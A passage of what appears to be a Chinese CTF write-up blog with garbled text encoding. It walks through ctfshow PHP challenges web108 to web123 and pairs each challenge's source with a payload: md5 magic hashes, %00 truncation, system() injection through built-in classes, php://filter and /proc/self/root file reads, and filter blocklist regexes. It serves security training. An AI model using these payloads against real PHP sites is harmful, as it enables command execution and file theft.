class="line">  </span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line">  </span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">  </span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line">  </span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line">  </span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">  </span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line">  </span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line">  </span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line">  </span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line">  </span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="number">0x02</span> <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>())</span><br><span class="line">  </span><br><span class="line"><span class="number">0x03</span> <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(str).<span class="string">&quot;SALT&quot;</span>)</span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">0e774261293712168181959463563504</span></span><br></pre></td></tr></table></figure>


<h2 id="web108-00æˆªæ–­"><a href="#web108-00æˆªæ–­" class="headerlink" title="web108(%00æˆªæ–­)"></a>web108(%00æˆªæ–­)</h2><h3 id="ereg-å‡½æ•°"><a href="#ereg-å‡½æ•°" class="headerlink" title="ereg()å‡½æ•°"></a>ereg()å‡½æ•°</h3><p>ereg()å‡½æ•°ç”¨æŒ‡å®šçš„æ¨¡å¼æœç´¢ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­æŒ‡å®šçš„å­—ç¬¦ä¸²,å¦‚æœåŒ¹é…æˆåŠŸè¿”å›true,å¦åˆ™,åˆ™è¿”å›falseã€‚æœç´¢å­—æ¯çš„å­—ç¬¦æ˜¯å¤§å°å†™æ•æ„Ÿçš„ã€‚</p>
<p>å¯é€‰çš„è¾“å…¥å‚æ•°è§„åˆ™åŒ…å«ä¸€ä¸ªæ•°ç»„çš„æ‰€æœ‰åŒ¹é…è¡¨è¾¾å¼,ä»–ä»¬è¢«æ­£åˆ™è¡¨è¾¾å¼çš„æ‹¬å·åˆ†ç»„ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ereg</span> (<span class="string">&quot;^[a-zA-Z]+$&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>])===<span class="literal">FALSE</span>)  &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//åªæœ‰36dçš„äººæ‰èƒ½çœ‹åˆ°flag</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">strrev</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))==<span class="number">0x36d</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>è¿™é¢˜é™åˆ¶cåªèƒ½æ˜¯<strong>ä¸€ä¸ªæˆ–å¤šä¸ªå¤§å°å†™å­—æ¯</strong>ã€‚</p>
<h3 id="strrev-å‡½æ•°"><a href="#strrev-å‡½æ•°" class="headerlink" title="strrev()å‡½æ•°"></a>strrev()å‡½æ•°</h3><p>strrev() å‡½æ•°åè½¬å­—ç¬¦ä¸²ã€‚</p>
<h3 id="intval-å‡½æ•°"><a href="#intval-å‡½æ•°" class="headerlink" title="intval()å‡½æ•°"></a>intval()å‡½æ•°</h3><p>intval() å‡½æ•°ç”¨äºè·å–å˜é‡çš„æ•´æ•°å€¼ã€‚</p>
<p>è¿™é¢˜åŒæ—¶åˆè¦æ±‚cåè½¬åä¸0x36dç›¸ç­‰ï¼ŒåŒæ—¶æ»¡è¶³è¿™ä¸¤ç‚¹ï¼Œéœ€è¦ç”¨åˆ°%00æˆªæ–­ã€‚</p>
<p>æœ€ç»ˆpayload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=a%<span class="number">00778</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web109-Exception-å¼‚å¸¸å¤„ç†ç±»"><a href="#web109-Exception-å¼‚å¸¸å¤„ç†ç±»" class="headerlink" title="web109(Exception å¼‚å¸¸å¤„ç†ç±»)"></a>web109(<a href="http://c.biancheng.net/view/6253.html">Exception å¼‚å¸¸å¤„ç†ç±»</a>)</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>ç¬¬ä¹è¡Œæ–°å¢ä¸€ä¸ªç±»ï¼Œé‚£è‚¯å®šæ˜¯å†…ç½®ç±»</p>
<p>v2å“ªé‡Œåˆå‡ºç°ä¸€ä¸ªæ‹¬å·ï¼Œè¯´æ˜æ˜¯æŠŠå®ƒå½“ä½œä¸€ä¸ªå‡½æ•°æ¥è°ƒç”¨ï¼Œä½¿ç”¨ä¸€ä¸ªæœ‰å›æ˜¾çš„å†…ç½®ç±»ç»™V1ï¼ŒV2RCEå³å¯ã€‚</p>
<p>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?v1=<span class="built_in">Exception</span>&amp;v2=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat fl36dg.txt&#x27;</span>)</span><br><span class="line">?v1=ReflectionClass&amp;v2=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat fl36dg.txt&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web110"><a href="#web110" class="headerlink" title="web110"></a>web110</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p><strong>payload:</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?v1=<span class="built_in">FilesystemIterator</span>&amp;v2=getcwd</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>æ„é€ åå›æ˜¾ä¸€ä¸ª<code>fl36dga.txt</code>ï¼Œè®¿é—®å¾—åˆ°flag</p>
<p><strong>åŸç†ï¼š</strong></p>
<h3 id="FilesystemIterator"><a href="#FilesystemIterator" class="headerlink" title="FilesystemIterator"></a>FilesystemIterator</h3><p>è·å–æŒ‡å®šç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶</p>
<h2 id="getcwd-å‡½æ•°"><a href="#getcwd-å‡½æ•°" class="headerlink" title="getcwd()å‡½æ•°"></a>getcwd()å‡½æ•°</h2><p>è·å–å½“å‰å·¥ä½œç›®å½• è¿”å›å½“å‰å·¥ä½œç›®å½•</p>
<h1 id="web111"><a href="#web111" class="headerlink" title="web111"></a>web111</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params">&amp;<span class="variable">$v1</span>,&amp;<span class="variable">$v2</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;$<span class="subst">$v1</span> = &amp;$<span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$$v1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">getFlag</span>(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>è¿™é‡Œç»™v1å’Œv2èµ‹å€¼ï¼Œç„¶åv2çš„å€¼åˆä¼šèµ‹ç»™v1ï¼Œè¦†ç›–v1åŸæ¥çš„å€¼</p>
<h3 id="è¶…å…¨å±€å˜é‡-GLOBALS"><a href="#è¶…å…¨å±€å˜é‡-GLOBALS" class="headerlink" title="è¶…å…¨å±€å˜é‡$GLOBALS"></a>è¶…å…¨å±€å˜é‡$GLOBALS</h3><p>å®˜æ–¹è¯´æ˜</p>
<ol>
<li>$GLOBALS â€” å¼•ç”¨å…¨å±€ä½œç”¨åŸŸä¸­å¯ç”¨çš„å…¨éƒ¨å˜é‡ã€‚</li>
<li>ä¸€ä¸ªåŒ…å«äº†å…¨éƒ¨å˜é‡çš„å…¨å±€ç»„åˆæ•°ç»„ã€‚å˜é‡çš„åå­—å°±æ˜¯æ•°ç»„çš„é”®ã€‚</li>
<li>å³å‡ºç°è¿‡çš„å…¨å±€å˜é‡ï¼Œå°±å¯ä»¥é€šè¿‡$GLOBALSè¿™ä¸ªæ•°ç»„å–å¾—ã€‚</li>
<li>PHPç”Ÿå‘½å‘¨æœŸä¸­ï¼Œå®šä¹‰åœ¨å‡½æ•°ä½“å¤–éƒ¨çš„æ‰€è°“å…¨å±€å˜é‡ï¼Œå‡½æ•°å†…éƒ¨æ˜¯ä¸èƒ½ç›´æ¥è·å¾—çš„ã€‚<br>payload: <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?v1=ctfshow&amp;v2=GLOBALS</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="web112"><a href="#web112" class="headerlink" title="web112"></a>web112</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Firebasky</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-30 23:47:49</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\.\.\/|http|https|data|input|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç›´æ¥ç”¨filterä¼ªåè®®è¯»å–æ–‡ä»¶å³å¯:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/resource=flag.php</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h1><p>å’Œweb112ç›¸æ¯”ï¼Œå¤šäº†ä¸€ä¸ªé™åˆ¶æ¡ä»¶<code>filter</code><br>è¿™é‡Œå¯ä»¥ç”¨web112ç»™å‡ºçš„å§¿åŠ¿</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=compress.zlib:<span class="comment">//flag.php</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¶…è¿‡20æ¬¡è½¯è¿æ¥åå°±å¯ä»¥ç»•è¿‡is_file</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/p</span><br><span class="line">roc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/pro</span><br><span class="line">c/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/</span><br><span class="line"><span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/se</span><br><span class="line">lf/root/proc/<span class="built_in">self</span>/root/<span class="keyword">var</span>/www/html/flag.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h1><p>è¿™é¢˜æŠŠcompressè¿™äº›è¿‡æ»¤äº†ï¼Œä½†æ˜¯æŠŠfilteræ”¾å‡ºæ¥äº†ã€‚ã€‚ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥é¢˜è§£å’Œweb112ä¸€æ ·</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/resource=flag.php</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Firebasky</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-01 15:08:19</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$num</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;e&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;+&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$num</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$num</span>) <span class="keyword">and</span> <span class="variable">$num</span>!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">trim</span>(<span class="variable">$num</span>)!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">filter</span>(<span class="variable">$num</span>)==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hacker!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!!!&quot;</span>;</span><br><span class="line">&#125; hacker!!!</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="trimå‡½æ•°"><a href="#trimå‡½æ•°" class="headerlink" title="trimå‡½æ•°"></a>trimå‡½æ•°</h3><p>è¯­æ³• <code>trim(string,charlist)</code>å‚æ•°</p>
<blockquote>
<p>string â€”å¿…éœ€ã€‚è§„å®šè¦æ£€æŸ¥çš„å­—ç¬¦ä¸²ã€‚<br>charlistâ€”å¯é€‰ã€‚è§„å®šä»å­—ç¬¦ä¸²ä¸­åˆ é™¤å“ªäº›å­—ç¬¦ã€‚å¦‚æœçœç•¥è¯¥å‚æ•°ï¼Œåˆ™ç§»é™¤ä¸‹åˆ—æ‰€æœ‰å­—ç¬¦ï¼š<br>â€œ\0â€ - NULL<br>â€œ\tâ€ - åˆ¶è¡¨ç¬¦<br>â€œ\nâ€ - æ¢è¡Œ<br>â€œ\x0Bâ€ - å‚ç›´åˆ¶è¡¨ç¬¦<br>â€œ\râ€ - å›è½¦<br>â€œ â€œ - ç©ºæ ¼</p>
</blockquote>
<p>trim+is_numericçš„æµ‹è¯•:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt;=<span class="number">128</span> ; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="variable">$x</span>=<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>).<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">   <span class="keyword">if</span>(<span class="title function_ invoke__">trim</span>(<span class="variable">$x</span>)!==<span class="string">&#x27;1&#x27;</span> &amp;&amp;  <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å¯åˆ©ç”¨çš„åªå‰©<code>%0c</code>äº†<br>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">num=%<span class="number">0</span>c36</span><br></pre></td></tr></table></figure>

<h1 id="web123"><a href="#web123" class="headerlink" title="web123"></a>web123</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Firebasky</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?/&quot;</span>, <span class="variable">$c</span>)&amp;&amp;<span class="variable">$c</span>&lt;=<span class="number">18</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);  </span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ä¸€ä¸ªéš¾ç‚¹æ˜¯è¿™é‡Œ</p>
